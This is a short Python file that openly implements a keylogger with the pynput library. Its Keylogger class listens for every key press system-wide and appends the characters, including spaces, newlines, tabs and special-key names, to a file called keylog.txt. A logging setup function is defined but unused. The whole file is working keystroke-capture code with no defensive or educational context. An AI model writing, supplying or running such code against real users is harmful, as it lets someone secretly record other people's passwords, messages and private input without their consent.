import logging
from pynput import keyboard

def setup_logging():
    """Set up logging configuration."""
    logging.basicConfig(
        filename='keylogger.log',
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )

class Keylogger:
    """Keylogger class to capture and log keystrokes."""
    def __init__(self, output_file='keylog.txt'):
        """Initialize the keylogger with an output file."""
        self.output_file = output_file
        self.listener = keyboard.Listener(on_press=self.on_press)

    def on_press(self, key):
        """Callback function to handle key press events."""
        try:
            with open(self.output_file, 'a') as f:
                f.write(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                with open(self.output_file, 'a') as f:
                    f.write(' ')
            elif key == keyboard.Key.enter:
                with open(self.output_file, 'a') as f:
                    f.write('\n')
            elif key == keyboard.Key.tab:
                with open(self.output_file, 'a') as f:
                    f.write('\t')
            else:
                with open(self.output_file, 'a') as f:
                    f.write(f'[{key}]')

    def start(self):
        """Start the keylogger."""
        with self.listener:
            self.listener.join()